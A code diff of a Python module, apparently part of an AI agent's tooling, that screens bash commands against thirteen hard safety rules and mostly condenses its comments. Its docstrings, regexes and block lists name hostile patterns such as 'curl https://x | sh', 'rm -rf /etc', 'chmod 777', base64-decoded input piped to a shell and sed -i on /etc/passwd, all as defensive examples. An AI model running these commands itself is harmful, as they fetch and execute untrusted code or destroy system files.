@@ -1,15 +1,9 @@
-"""Bash-command safety — Tier A hard floors that no mode / rule can override.
+"""Bash-command safety — Tier A hard floors no mode or rule can override.
 
-Pure policy module (no I/O, no journaling). The hook layer
-(``aura.application.hooks.bash_safety``) owns journaling and result emission.
-
-Parsing depth: quote-aware segment splitter + ``shlex.split`` for
-tokenization (no full bash AST). Per-rule limitations documented inline.
-
-Failure-mode inversion: if our OWN parsing crashes on weird input we
-return ``None`` rather than raising — a typo in this file would
+Pure policy (no I/O, no journaling). Failure-mode inversion: a bug in our
+own parser returns ``None`` rather than raising — a typo here would
 otherwise block every bash call. Rule-level signals (``shlex.split``
-raising as rule 3's trigger) still fail closed.
+raising as rule 12's trigger) still fail closed.
 """
 
 from __future__ import annotations
@@ -20,10 +14,8 @@ import shlex
 from dataclasses import dataclass
 from typing import Literal
 
-# 18 entries — the exhaustive zsh-builtin list that bypasses bash's
-# usual file-access / fd-owner checks. Not a superset of "dangerous zsh
-# builtins" in general; only the subset that attackers have actually
-# leveraged for sandbox escape in shell-allowlist tools.
+# Exhaustive zsh-builtin set that bypasses bash's file-access / fd-owner checks.
+# Only the subset attackers have leveraged for sandbox escape — not "all dangerous zsh builtins".
 ZSH_DANGEROUS_COMMANDS: frozenset[str] = frozenset({
     "zmodload", "emulate",
     "sysopen", "sysread", "syswrite", "sysseek",
@@ -50,18 +42,8 @@ Reason = Literal[
 ]
 
 
-# ---------------------------------------------------------------------------
-# Shared data — system prefixes / shell names / destructive commands
-# ---------------------------------------------------------------------------
-
-# System-owned path prefixes. Writing (>, >>, sed -i, rm -rf) under any of
-# these is a Tier A hard floor — the agent cannot make those edits "safe"
-# even if the user grants permission in the current session.
-#
-# Intentionally omitted: ``/var`` (legitimate log / tmp subtrees under it),
-# ``/opt`` (user-installed software, user-owned on common distros), ``/tmp``
-# (obviously legitimate scratch space). Add here only if the attack surface
-# outweighs the false-positive rate.
+# System-owned prefixes — writing under any is a Tier A hard floor even with user grant.
+# Intentionally omitted: /var (legit log/tmp subtrees), /opt (user-installed), /tmp (scratch).
 _SYSTEM_PATH_PREFIXES: tuple[str, ...] = (
     "/etc",
     "/usr",
@@ -74,32 +56,26 @@ _SYSTEM_PATH_PREFIXES: tuple[str, ...] = (
     "/root",
     "/lib",
     "/lib64",
-    "/System",      # macOS
-    "/Library",     # macOS (system-level; user Library is ~/Library)
+    "/System",
+    "/Library",
 )
 
-# Targets that look like /dev/... but are NOT real system writes. /dev/null
-# is the canonical "discard output" target; /dev/stdout and /dev/stderr are
-# legitimate re-routings; /dev/tty is a terminal handle.
+# /dev/... targets that are legitimate output discards / tty handles.
 _SAFE_DEV_TARGETS: frozenset[str] = frozenset({
     "/dev/null",
     "/dev/stdout",
     "/dev/stderr",
     "/dev/tty",
-    "/dev/fd",  # /dev/fd/N
+    "/dev/fd",
 })
 
-# Shell interpreter names — if any of these is the FIRST token of a
-# pipeline segment that follows a `|`, the preceding segment's stdout is
-# being executed as shell script (``curl ... | bash``). This is the
-# canonical "remote execution of untrusted content" pattern.
+# A shell name as the first token after ``|`` means the preceding segment's stdout
+# is executed as script — canonical ``curl X | bash`` remote-exec pattern.
 _SHELL_NAMES: frozenset[str] = frozenset({
     "sh", "bash", "zsh", "ksh", "dash", "csh", "tcsh", "fish",
 })
 
-# Destructive commands for the exec / obfuscation rules. ``exec rm -rf x``
-# replaces the shell with rm; ``exec chmod 777 /`` likewise. We block the
-# first-token==exec + dangerous-second-token combo outright.
+# ``exec CMD`` replaces the shell with CMD; if CMD is destructive the shell cannot recover.
 _DESTRUCTIVE_COMMANDS: frozenset[str] = frozenset({
     "rm", "chmod", "chown", "dd", "mkfs", "shred", "wipe",
 })
@@ -107,136 +83,98 @@ _DESTRUCTIVE_COMMANDS: frozenset[str] = frozenset({
 
 @dataclass(frozen=True)
 class BashSafetyViolation:
-    """A single-reason reject. ``detail`` is cited verbatim in the
-    ToolResult.error surfaced to the model, so keep it one line and
-    actionable."""
-
+    # ``detail`` is cited verbatim in ToolResult.error surfaced to the model.
     reason: Reason
     detail: str
 
 
-# Segment-split regex — same separators shlex / bash treat as command
-# boundaries. Compiled once; used for the per-segment zsh-builtin scan.
 _SEGMENT_SPLIT = re.compile(r"(?:\|\||&&|[;|\n])")
 
 
 def check_bash_safety(command: str) -> BashSafetyViolation | None:
-    """Return the first Tier A violation, or None if the command is safe.
+    """Return the first Tier A violation, or None.
 
-    Order (documented contract — tests depend on it):
-      1. cr_outside_double_quote   — cheap, no tokenization needed
-      2. command_substitution      — ``$(...)`` / ``` `...` ``` / eval / ``-c``
-      3. obfuscated_execution      — ``base64 -d`` / ``xxd -r`` piped to shell
-      4. pipe_to_shell             — ``curl X | sh``, ``wget X | bash``
-      5. zsh_dangerous_command     — per-segment first-token scan
-      6. exec_destructive          — ``exec rm -rf x`` and friends
-      7. destructive_removal       — ``rm -rf /`` / ``rm -rf /etc`` on system prefixes
-      8. world_writable_chmod      — ``chmod 777`` / ``chmod -R 0777``
-      9. root_chown                — ``chown root ...``
-     10. sed_inplace_system_path   — ``sed -i`` targeting system prefixes
-     11. redirect_to_system_path   — ``> /etc/...`` / ``>> /boot/...``
-     12. malformed_with_separator  — shlex raises + separator outside quotes
-     13. cd_git_compound           — both tokens present in the flat tokenization
+    Order (tested contract):
+      1. cr_outside_double_quote
+      2. command_substitution
+      3. obfuscated_execution
+      4. pipe_to_shell
+      5. zsh_dangerous_command
+      6. exec_destructive
+      7. destructive_removal
+      8. world_writable_chmod
+      9. root_chown
+     10. sed_inplace_system_path
+     11. redirect_to_system_path
+     12. malformed_with_separator
+     13. cd_git_compound
 
-    Rule 2 precedes rule 5 because command substitution is the canonical
-    bypass of the zsh-builtin check: ``echo $(zmodload x)`` tokenizes with
-    ``$(zmodload`` as one token and ``x)`` as another, so the zsh rule
-    never sees ``zmodload`` as a first token — bash nonetheless expands
-    the substitution at runtime and executes it.
-
-    Rule 3 (obfuscated_execution) precedes rule 4 (pipe_to_shell) because
-    ``base64 -d ... | sh`` is a strict subset of pipe-to-shell but the
-    obfuscation reason is more informative for the model's error message.
+    Rule 2 precedes rule 5 because ``$(zmodload x)`` tokenizes such that the
+    zsh rule never sees ``zmodload`` as a first token, yet bash expands the
+    substitution at runtime. Rule 3 precedes rule 4 because base64-into-shell
+    is a strict subset of pipe-to-shell but its dedicated error message
+    guides the model better.
     """
-    if not isinstance(command, str) or not command:
+    if not command:
         return None
 
     try:
-        # 1. CR outside double quotes.
         violation = _check_cr_outside_quotes(command)
         if violation is not None:
             return violation
 
-        # 2. Command substitution — bypass of all other static checks.
         violation = _check_command_substitution(command)
         if violation is not None:
             return violation
 
-        # 3. Obfuscated execution (subset of pipe-to-shell with a more
-        # informative error message).
         violation = _check_obfuscated_execution(command)
         if violation is not None:
             return violation
 
-        # 4. Pipe to shell — ``curl X | sh``.
         violation = _check_pipe_to_shell(command)
         if violation is not None:
             return violation
 
-        # 5. ZSH dangerous command (per segment).
         violation = _check_zsh_dangerous(command)
         if violation is not None:
             return violation
 
-        # 6. exec + destructive command.
         violation = _check_exec_destructive(command)
         if violation is not None:
             return violation
 
-        # 7. rm -rf on system prefixes.
         violation = _check_destructive_removal(command)
         if violation is not None:
             return violation
 
-        # 8. chmod 777 (world-writable).
         violation = _check_world_writable_chmod(command)
         if violation is not None:
             return violation
 
-        # 9. chown root ...
         violation = _check_root_chown(command)
         if violation is not None:
             return violation
 
-        # 10. sed -i on system paths.
         violation = _check_sed_inplace_system_path(command)
         if violation is not None:
             return violation
 
-        # 11. Redirect to system path.
         violation = _check_redirect_to_system_path(command)
         if violation is not None:
             return violation
 
-        # 12. Malformed + separator.
         violation = _check_malformed_with_separator(command)
         if violation is not None:
             return violation
 
-        # 13. cd + git compound.
-        violation = _check_cd_git_compound(command)
-        if violation is not None:
-            return violation
-
+        return _check_cd_git_compound(command)
+    except Exception:  # noqa: BLE001 — failure-mode inversion; see module docstring
         return None
-    except Exception:  # noqa: BLE001 — see module docstring "failure mode inversion"
-        # A bug in our own parser must not block every bash call the
-        # agent ever makes. The four real attack classes all use
-        # parseable inputs; a parser crash means we have a bug.
-        return None
-
-
-# ---------------------------------------------------------------------------
-# Rule 1 — carriage return outside double quotes
-# ---------------------------------------------------------------------------
 
 
 def _check_cr_outside_quotes(command: str) -> BashSafetyViolation | None:
-    """Naive toggle: ``"`` flips double-quote state; raw ``\\r`` outside
-    is a reject. Doesn't model backslash-escapes or single quotes —
-    bash's rules are complex, but the CR-specific differential (TZ=UTC
-    \\r echo evil) has no quoting in the attack, so a naive state
-    machine is sufficient."""
+    """Naive ``"`` toggle; raw ``\\r`` outside is reject. The CR attack has
+    no quoting around its payload, so a one-state machine suffices."""
     in_double_quote = False
     for ch in command:
         if ch == '"':
@@ -249,32 +187,23 @@ def _check_cr_outside_quotes(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule 2 — command substitution / eval / shell -c flag (bypass of static checks)
-# ---------------------------------------------------------------------------
-
-
-# Single-quote strip FIRST — bash does NOT substitute inside '...' literals,
-# so a literal "$(" there is harmless. Then scan the residual for the three
-# dynamic-exec patterns.
+# Single-quote regions are stripped before substitution scan — bash disables expansion in '...'.
 _SINGLE_QUOTED = re.compile(r"'[^']*'")
 _DYNAMIC_EXEC = re.compile(
     r"""
-    \$\(           |  # POSIX command substitution
-    `              |  # backtick substitution
-    (?<![\w-])(?:bash|sh|zsh)\s+-c(?:\s|$) |  # shell -c <cmd>
-    (?<![\w-])eval(?:\s|$)                    # eval as a free token
+    \$\(           |
+    `              |
+    (?<![\w-])(?:bash|sh|zsh)\s+-c(?:\s|$) |
+    (?<![\w-])eval(?:\s|$)
     """,
     re.VERBOSE,
 )
 
 
 def _check_command_substitution(command: str) -> BashSafetyViolation | None:
-    """Reject dynamic-execution constructs that evaluate arbitrary strings at
-    runtime: ``$(...)`` / backticks / ``(ba|z|)sh -c`` / ``eval``. Each is
-    a bypass vector — the outer command is innocent-looking; the inner
-    payload only materializes when bash expands it. Single-quoted regions
-    are stripped before scanning (bash disables substitution in ``'...'``)."""
+    """Reject ``$(...)`` / backticks / ``(ba|z|)sh -c`` / ``eval`` — each is a
+    runtime-expansion vector where the outer command is innocent and the inner
+    payload only materializes when bash expands it."""
     residual = _SINGLE_QUOTED.sub("", command)
     if _DYNAMIC_EXEC.search(residual):
         return BashSafetyViolation(
@@ -287,15 +216,7 @@ def _check_command_substitution(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule 3 — zsh dangerous builtin as a segment's first token
-# ---------------------------------------------------------------------------
-
-
 def _check_zsh_dangerous(command: str) -> BashSafetyViolation | None:
-    """Split on command separators; for each segment, try to tokenize;
-    if the first token is in the dangerous set, reject. Silent-skip
-    segments whose tokenization fails — rule 3 covers that case."""
     for segment in _SEGMENT_SPLIT.split(command):
         stripped = segment.strip()
         if not stripped:
@@ -312,22 +233,16 @@ def _check_zsh_dangerous(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule 3 — malformed tokenization AND separator present outside quotes
-# ---------------------------------------------------------------------------
-
-
 _QUOTED_REGION = re.compile(r'"[^"]*"|\'[^\']*\'')
 _SEPARATOR_OUTSIDE_QUOTES = re.compile(r"(?:\|\||&&|;)")
 
 
 def _check_malformed_with_separator(command: str) -> BashSafetyViolation | None:
+    """Unparseable tokens adjacent to a separator outside quotes — a
+    re-entry vector after a failed tokenization."""
     try:
         shlex.split(command, posix=True)
     except ValueError:
-        # Strip matched quoted regions, THEN look for separators in what
-        # remains. If a separator survives, a malformed tokenization +
-        # re-entry vector is present.
         stripped = _QUOTED_REGION.sub("", command)
         if _SEPARATOR_OUTSIDE_QUOTES.search(stripped):
             return BashSafetyViolation(
@@ -337,21 +252,12 @@ def _check_malformed_with_separator(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule 4 — cd + git compound
-# ---------------------------------------------------------------------------
-
-
 def _check_cd_git_compound(command: str) -> BashSafetyViolation | None:
-    """Flat tokenization: if BOTH ``cd`` and ``git`` appear as
-    free-standing tokens anywhere in the command, reject. Order and
-    adjacency don't matter — a malicious ``.git/config`` fires on any
-    subsequent git invocation within the repo."""
+    """Both ``cd`` and ``git`` as free tokens — a malicious .git/config fires
+    on any subsequent git invocation in the new dir, so order doesn't matter."""
     try:
         tokens = shlex.split(command, posix=True)
     except ValueError:
-        # Rule 3 already handled; here the compound check simply
-        # can't run, so no rule-4 signal.
         return None
     if "cd" in tokens and "git" in tokens:
         return BashSafetyViolation(
@@ -361,20 +267,9 @@ def _check_cd_git_compound(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Shared helpers — quote-aware segmentation and path classification
-# ---------------------------------------------------------------------------
-
-
 def _split_segments_quote_aware(command: str) -> list[str]:
-    """Split on ``;``/``&&``/``||``/``|``/newline, but ONLY when the separator
-    appears OUTSIDE a quoted region. Needed so ``echo "rm -rf" > /tmp/x``
-    stays a single segment instead of being torn apart on the literal
-    ``-rf`` vs. the pipe inside quotes.
-
-    Stdlib-only: hand-rolled one-pass state machine. Tracks ``'...'`` /
-    ``"..."`` / backslash-escape. Returns raw substrings (caller re-tokenizes
-    each segment with ``shlex`` as needed)."""
+    """Split on ``;``/``&&``/``||``/``|``/newline outside quoted regions.
+    Needed so ``echo "rm -rf" > /tmp/x`` stays one segment."""
     segments: list[str] = []
     buf: list[str] = []
     in_single = False
@@ -384,7 +279,6 @@ def _split_segments_quote_aware(command: str) -> list[str]:
     while i < n:
         ch = command[i]
 
-        # Backslash escapes the next character outside single quotes.
         if ch == "\\" and not in_single and i + 1 < n:
             buf.append(ch)
             buf.append(command[i + 1])
@@ -404,7 +298,6 @@ def _split_segments_quote_aware(command: str) -> list[str]:
             continue
 
         if not in_single and not in_double:
-            # Two-char separators first.
             two = command[i:i + 2]
             if two in ("&&", "||"):
                 segments.append("".join(buf))
@@ -425,10 +318,8 @@ def _split_segments_quote_aware(command: str) -> list[str]:
 
 
 def _pipe_segments_quote_aware(command: str) -> list[str]:
-    """Pipeline-only split — respects quotes, splits on ``|`` only (NOT
-    ``||``). Needed for the pipe-to-shell rule: we want to know what
-    follows each ``|`` in a pipeline, independent of ``&&``/``;`` boundaries
-    which introduce separate statements."""
+    """Pipeline-only split — ``|`` outside quotes, NOT ``||``. Needed so
+    pipe-to-shell sees only true pipeline boundaries."""
     segments: list[str] = []
     buf: list[str] = []
     in_single = False
@@ -457,7 +348,6 @@ def _pipe_segments_quote_aware(command: str) -> list[str]:
             continue
 
         if not in_single and not in_double:
-            # Skip ``||`` — that's a statement separator, not a pipe.
             if command[i:i + 2] == "||":
                 buf.append("||")
                 i += 2
@@ -476,17 +366,8 @@ def _pipe_segments_quote_aware(command: str) -> list[str]:
 
 
 def _expand_braces(text: str) -> list[str]:
-    """Expand POSIX-style ``{a,b,c}`` brace lists into cartesian product.
-
-    Handles single-level + nested forms (``/{a,b/{c,d}}``). Sequence
-    expressions (``{1..10}``) are NOT supported — the security-relevant
-    case is enumerated alternatives. When the input has no balanced
-    ``{...}`` group, returns ``[text]`` unchanged.
-
-    F-04-008 — closes the module-docstring's brace-expansion gap so
-    ``rm -rf /{etc,tmp}`` flags both targets at the safety check.
-    """
-    # Find the first balanced { ... } group at the top level.
+    """Expand ``{a,b,c}`` brace lists (nested OK; sequence ``{1..10}`` not)
+    so ``rm -rf /{etc,tmp}`` flags both targets at the safety check."""
     start = text.find("{")
     if start == -1:
         return [text]
@@ -505,7 +386,6 @@ def _expand_braces(text: str) -> list[str]:
     prefix = text[:start]
     suffix = text[end + 1:]
     body = text[start + 1: end]
-    # Split on commas at depth 0 within this group.
     parts: list[str] = []
     depth = 0
     cursor = 0
@@ -519,7 +399,6 @@ def _expand_braces(text: str) -> list[str]:
             cursor = i + 1
     parts.append(body[cursor:])
     if len(parts) <= 1:
-        # Not a real brace list — treat as literal.
         return [text]
     out: list[str] = []
     suffix_expansions = _expand_braces(suffix)
@@ -531,34 +410,20 @@ def _expand_braces(text: str) -> list[str]:
 
 
 def _is_system_path(path: str) -> bool:
-    """True iff ``path`` sits under a known system-owned prefix.
-
-    Tilde (``~``, ``~root``) and environment-variable (``$HOME``, ``${VAR}``)
-    forms are expanded before the prefix check so ``rm -rf $HOME`` and
-    ``rm -rf ~root`` are caught. Brace expansion (``rm -rf /{etc,tmp}``)
-    is also resolved so each enumerated alternative is checked
-    independently. Glob expansion (``/etc/*``) is still NOT resolved —
-    see module docstring for the residual gap.
-    """
+    """Tilde + env-var + brace expansion BEFORE prefix scan; glob (``/etc/*``)
+    still not resolved. If any brace alternative is a system path, the
+    whole expression is treated as one."""
     if not path:
         return False
-    # Strip surrounding quotes that shlex would have stripped.
     cleaned = path.strip("\"'")
-    # Resolve tilde + env-var expansion BEFORE the prefix scan so obfuscated
-    # forms like ``$HOME`` (root's home is /root) and ``~root`` are caught.
     cleaned = os.path.expandvars(os.path.expanduser(cleaned))
-    # F-04-008 — fan out brace alternatives so each path is checked.
-    # If ANY alternative is a system path, treat the whole expression as
-    # one (the safest possible behaviour for ``rm -rf {/etc,/tmp}``).
     candidates = _expand_braces(cleaned)
     return any(_check_single_path(c) for c in candidates)
 
 
 def _check_single_path(cleaned: str) -> bool:
-    """Match a single (post-expansion) path against system prefixes."""
     if cleaned in _SAFE_DEV_TARGETS:
         return False
-    # /dev/fd/N family
     if cleaned.startswith("/dev/fd/"):
         return False
     for prefix in _SYSTEM_PATH_PREFIXES:
@@ -568,9 +433,7 @@ def _check_single_path(cleaned: str) -> bool:
 
 
 def _first_token(segment: str) -> str | None:
-    """Return the first shlex token of ``segment`` (after leading
-    assignments like ``FOO=bar cmd``). Returns ``None`` if tokenization
-    fails or the segment is empty / all-assignment."""
+    """First shlex token after leading ``VAR=value`` assignments."""
     stripped = segment.strip()
     if not stripped:
         return None
@@ -579,9 +442,7 @@ def _first_token(segment: str) -> str | None:
     except ValueError:
         return None
     for tok in tokens:
-        # Skip leading VAR=value assignments — the actual command comes after.
         if "=" in tok and not tok.startswith("=") and tok[0].isalpha():
-            # Only strip if the LHS is identifier-like (no spaces, etc.)
             lhs = tok.split("=", 1)[0]
             if lhs.replace("_", "").isalnum():
                 continue
@@ -589,23 +450,9 @@ def _first_token(segment: str) -> str | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: pipe to shell — curl|sh, wget|bash, echo|sh, etc.
-# ---------------------------------------------------------------------------
-
-
 def _check_pipe_to_shell(command: str) -> BashSafetyViolation | None:
-    """If any pipeline segment AFTER the first ``|`` has a shell
-    interpreter as its first token, reject. Captures:
-
-      curl https://x | sh
-      wget -qO- https://x | bash
-      echo '...' | zsh
-
-    Does NOT capture pipe-to-shell where the interpreter is aliased or
-    invoked via ``/bin/sh`` — handling full paths would require another
-    rule (see ``/bin/`` redirect catch below); aliased shells are beyond
-    static reach without running bash."""
+    """Shell interpreter as first token of any segment after ``|``.
+    Misses aliased shells (beyond static reach without running bash)."""
     segments = _pipe_segments_quote_aware(command)
     if len(segments) < 2:
         return None
@@ -613,7 +460,6 @@ def _check_pipe_to_shell(command: str) -> BashSafetyViolation | None:
         tok = _first_token(seg)
         if tok is None:
             continue
-        # Normalize ``/bin/sh`` / ``/usr/bin/bash`` etc. to the basename.
         basename = tok.rsplit("/", 1)[-1]
         if basename in _SHELL_NAMES:
             return BashSafetyViolation(
@@ -623,18 +469,8 @@ def _check_pipe_to_shell(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: exec + destructive — exec rm -rf x, exec chmod 777 /
-# ---------------------------------------------------------------------------
-
-
 def _check_exec_destructive(command: str) -> BashSafetyViolation | None:
-    """``exec CMD ARGS`` replaces the current shell with CMD. If CMD is
-    in the destructive set, reject outright — the shell wouldn't survive
-    the operation even if the agent later tried to recover.
-
-    Per-segment check: each statement-level segment's first two tokens
-    are inspected; ``foo && exec rm -rf x`` catches the second segment."""
+    """``exec CMD`` replaces the shell with CMD; destructive CMDs cannot be recovered from."""
     for segment in _split_segments_quote_aware(command):
         stripped = segment.strip()
         if not stripped:
@@ -655,20 +491,11 @@ def _check_exec_destructive(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: destructive removal on system prefixes — rm -rf /etc, rm -rf /
-# ---------------------------------------------------------------------------
-
-
 def _check_destructive_removal(command: str) -> BashSafetyViolation | None:
-    """Per-segment: if ``rm`` is the command, any flag among ``-r``/``-R``/``-f``
-    (including combined short flags like ``-rf``/``-Rfv``) is present, AND
-    any positional argument resolves under a system prefix (or is exactly
-    ``/``), reject.
-
-    Does NOT block ``rm -rf /tmp/foo`` — tmp is legitimate scratch space;
-    the system-path gate is what makes this Tier A rather than an overbroad
-    tool-kill-switch."""
+    """``rm`` + any of ``-r``/``-R``/``-f`` (incl. combined ``-rf``) +
+    positional under a system prefix (or ``/``). ``rm -rf /tmp/foo`` is
+    allowed — the system-path gate is what keeps this Tier A rather than
+    an overbroad kill-switch."""
     for segment in _split_segments_quote_aware(command):
         stripped = segment.strip()
         if not stripped:
@@ -688,7 +515,6 @@ def _check_destructive_removal(command: str) -> BashSafetyViolation | None:
                     has_recursive_or_force = True
                 continue
             if tok.startswith("-") and len(tok) > 1:
-                # Combined short flags: -rf / -Rfv / -fr — any 'r'/'R'/'f' char.
                 if any(c in tok[1:] for c in ("r", "R", "f")):
                     has_recursive_or_force = True
                 continue
@@ -706,22 +532,16 @@ def _check_destructive_removal(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: world-writable chmod — 777 / 0777 / a+rwx on any path
-# ---------------------------------------------------------------------------
-
-
-# Match ``chmod [-R] 777`` / ``chmod 0777`` / ``chmod a+rwx`` / ``chmod +rwx``
-# anchored at word boundaries so ``chmod7777`` (not a real cmd) doesn't match.
+# Boundary-anchored ``chmod [-R] 777`` / ``0777`` / ``a+rwx`` so ``chmod7777`` doesn't match.
 _CHMOD_WORLD_WRITABLE = re.compile(
     r"""
-    \bchmod\b                 # chmod as its own token
-    (?:\s+-[A-Za-z]+)?        # optional short flags (e.g., -R, -Rv)
+    \bchmod\b
+    (?:\s+-[A-Za-z]+)?
     \s+
     (?:
-        0?777                 # octal 777 with optional leading zero
+        0?777
         |
-        [ugoa]*[+=][rwx]*w[rwx]*  # symbolic: a+w, o+w, go+rw, a=rwx, etc.
+        [ugoa]*[+=][rwx]*w[rwx]*
     )
     \b
     """,
@@ -730,15 +550,8 @@ _CHMOD_WORLD_WRITABLE = re.compile(
 
 
 def _check_world_writable_chmod(command: str) -> BashSafetyViolation | None:
-    """Reject ``chmod 777`` / ``chmod 0777`` / ``chmod a+w`` / ``chmod o+w``.
-    World-writable permissions on ANY path — not just system ones — are a
-    Tier A hard floor: the legitimate use cases (test fixtures, explicit
-    user-scoped sandboxes) are vanishingly rare compared to the attack
-    surface (backdooring shared config, exposing secrets)."""
-    # Check the RAW command — quote stripping would mask literals like
-    # ``echo "chmod 777"`` but that's inside double quotes, which means
-    # it's an argument to echo, not a chmod invocation. Use segment-aware
-    # check instead.
+    """Reject ``chmod 777`` / ``a+w`` / ``o+w`` on ANY path — legit use
+    cases are vanishingly rare vs the attack surface."""
     for segment in _split_segments_quote_aware(command):
         stripped = segment.strip()
         if not stripped:
@@ -749,7 +562,6 @@ def _check_world_writable_chmod(command: str) -> BashSafetyViolation | None:
             continue
         if not tokens or tokens[0] != "chmod":
             continue
-        # Reconstruct a safe string for the regex (tokens are unquoted).
         reconstructed = " ".join(tokens)
         if _CHMOD_WORLD_WRITABLE.search(reconstructed):
             return BashSafetyViolation(
@@ -759,14 +571,8 @@ def _check_world_writable_chmod(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: root chown — chown root / chown 0: / chown root:root
-# ---------------------------------------------------------------------------
-
-
 def _check_root_chown(command: str) -> BashSafetyViolation | None:
-    """``chown root ...`` / ``chown 0:0 ...`` grants root ownership. Always
-    Tier A — no legitimate agent workflow needs to reparent files to root."""
+    """``chown root`` / ``chown 0:0`` — no legit agent workflow reparents to root."""
     for segment in _split_segments_quote_aware(command):
         stripped = segment.strip()
         if not stripped:
@@ -777,7 +583,6 @@ def _check_root_chown(command: str) -> BashSafetyViolation | None:
             continue
         if not tokens or tokens[0] != "chown":
             continue
-        # First non-flag arg is the user[:group] spec.
         for tok in tokens[1:]:
             if tok.startswith("-"):
                 continue
@@ -787,29 +592,14 @@ def _check_root_chown(command: str) -> BashSafetyViolation | None:
                     reason="root_chown",
                     detail=f"chown to root ('{tok}') escalates ownership",
                 )
-            break  # Only the first non-flag arg is the owner spec.
+            break
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: sed -i on system paths — in-place edits to /etc/passwd etc.
-# ---------------------------------------------------------------------------
-
-
 def _check_sed_inplace_system_path(command: str) -> BashSafetyViolation | None:
-    """``sed -i '...' /etc/passwd`` rewrites a system config file. Reject
-    when BOTH:
-      - first token is ``sed``
-      - any of ``-i``, ``--in-place``, or combined short flag containing ``i``
-        is present
-      - any non-flag positional argument resolves under a system prefix
-
-    BSD-sed requires an argument to ``-i`` (e.g., ``sed -i '' ...``); the
-    next-token is consumed as the backup suffix, not a file. We handle this
-    by only treating the FINAL non-flag positional as the target file —
-    the common case; fully modelling BSD-sed vs. GNU-sed is out of scope
-    and doesn't change the decision (a system-path positional is still
-    system-path, wherever it appears)."""
+    """``sed -i`` (or combined ``-iE``/``-Ei``, or ``--in-place``) targeting a
+    system-path positional. BSD-sed's ``-i ''`` backup-suffix arg is not
+    modelled; a system-path positional remains system-path wherever it lands."""
     for segment in _split_segments_quote_aware(command):
         stripped = segment.strip()
         if not stripped:
@@ -830,7 +620,6 @@ def _check_sed_inplace_system_path(command: str) -> BashSafetyViolation | None:
             if tok.startswith("--"):
                 continue
             if tok.startswith("-") and len(tok) > 1:
-                # ``-i`` alone OR combined like ``-iE`` / ``-Ei``.
                 if "i" in tok[1:]:
                     has_inplace = True
                 continue
@@ -848,25 +637,18 @@ def _check_sed_inplace_system_path(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: redirect to system path — > /etc/foo, >> /boot/foo, &> /usr/bin/x
-# ---------------------------------------------------------------------------
-
-
-# Parse redirects OUTSIDE quoted regions. Match ``>``/``>>``/``&>``/``&>>``
-# followed by whitespace + a target token. Targets end at whitespace or
-# another shell metacharacter.
+# Leading ``\d`` lookbehind excludes ``2>&1`` (fd-dup, not file redirect).
 _REDIRECT_OUTSIDE_QUOTES = re.compile(
     r"""
-    (?<!\d)                     # no fd-number prefix (2>&1 is NOT a file redirect)
-    (?:&>>|&>|>>|>)             # the redirect operator
+    (?<!\d)
+    (?:&>>|&>|>>|>)
     \s*
     (
-        (?:'[^']*')             # single-quoted target
+        (?:'[^']*')
         |
-        (?:"[^"]*")             # double-quoted target
+        (?:"[^"]*")
         |
-        (?:[^\s;&|<>()]+)       # bare token up to whitespace or metachar
+        (?:[^\s;&|<>()]+)
     )
     """,
     re.VERBOSE,
@@ -874,19 +656,9 @@ _REDIRECT_OUTSIDE_QUOTES = re.compile(
 
 
 def _check_redirect_to_system_path(command: str) -> BashSafetyViolation | None:
-    """Scan for redirect operators outside quoted regions; if any target
-    resolves to a system path, reject. Does NOT model fd duplication
-    (``2>&1``) — the leading ``\\d`` lookbehind excludes that case. Does
-    NOT model ``>&filename`` (deprecated bash form); those are rare and
-    filenameless ``>&`` is fd-dup."""
-    # Strip contents of single-quoted regions (but keep the quotes as
-    # placeholders) so a literal ``'>/etc/foo'`` inside single quotes can't
-    # false-match. Double quotes still permit expansion, so double-quoted
-    # targets ARE honored by bash — we leave them in place.
-    #
-    # We don't strip quoted REGIONS because we need the regex to match
-    # ``> /etc/foo`` where the target is unquoted. Instead, we pre-compute
-    # the ranges of single-quoted content and skip matches inside them.
+    """Redirect targets outside single-quoted regions. Double-quoted targets
+    are honored — bash still expands them. ``>&filename`` (deprecated) not
+    modelled."""
     single_quoted_ranges: list[tuple[int, int]] = []
     in_single = False
     in_double = False
@@ -918,15 +690,8 @@ def _check_redirect_to_system_path(command: str) -> BashSafetyViolation | None:
     return None
 
 
-# ---------------------------------------------------------------------------
-# Rule: obfuscated execution — base64 -d | sh, xxd -r | bash
-# ---------------------------------------------------------------------------
-
-
-# Patterns that decode binary/encoded input and hand it to a shell. The
-# signature is the DECODER + pipe + SHELL on the same pipeline. Pure
-# pattern-level — stdlib can't tell ``base64 -d`` from ``base64 --help``
-# without running it; false-positive rate is acceptable because
+# Decoder-into-shell pipelines — stdlib can't distinguish ``base64 -d`` from
+# ``base64 --help`` without running it; false-positive rate accepted because
 # base64-into-shell has no legitimate agent use case.
 _OBFUSCATED_DECODERS = (
     r"base64\s+(?:-d|-D|--decode)",
@@ -935,20 +700,14 @@ _OBFUSCATED_DECODERS = (
 )
 _OBFUSCATED_EXEC_RE = re.compile(
     r"(?:" + "|".join(_OBFUSCATED_DECODERS) + r")"
-    r"[^|]*\|\s*(?:/[A-Za-z0-9_/.-]+/)?"  # optional /path/to/
+    r"[^|]*\|\s*(?:/[A-Za-z0-9_/.-]+/)?"
     r"(?:" + "|".join(re.escape(s) for s in _SHELL_NAMES) + r")\b",
 )
 
 
 def _check_obfuscated_execution(command: str) -> BashSafetyViolation | None:
-    """Decoder-into-shell pipelines: ``base64 -d foo | sh``,
-    ``openssl enc -d -base64 | bash``, ``xxd -r -p | zsh``. Covered as
-    a dedicated reason (not just ``pipe_to_shell``) because the error
-    message then tells the model *why* this subset is particularly bad
